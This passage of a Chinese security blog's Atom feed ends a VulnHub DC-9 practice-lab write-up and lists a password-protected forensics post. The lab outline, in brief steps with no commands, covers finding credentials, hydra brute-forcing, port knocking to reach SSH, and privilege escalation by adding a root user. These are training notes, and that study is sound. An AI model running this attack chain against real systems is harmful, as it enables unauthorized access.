找到网站登陆账密 和普通用户账密</p><p>3.使用普通用户账密 hydra爆破靶机登陆账密 </p><p>4.敲门服务 连接ssh</p><p>4.找到隐藏文件 切换用户</p><p>5.可执行程序 添加root用户提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-9&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-9&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-9&quot;&gt;&lt;/a&gt;vulnhub靶场DC-9&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023FIC(除了两个程序分析)</title>
    <link href="http://w3nx1z1.github.io/2024/04/13/2023FIC/"/>
    <id>http://w3nx1z1.github.io/2024/04/13/2023FIC/</id>
    <published>2024-04-13T12:31:22.799Z</published>
    <updated>2024-04-13T12:33:36.638Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9fb43e0121b98b661ac3613444f8ebabff674ecfa51fb767f22a74957b654905"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
</feed>
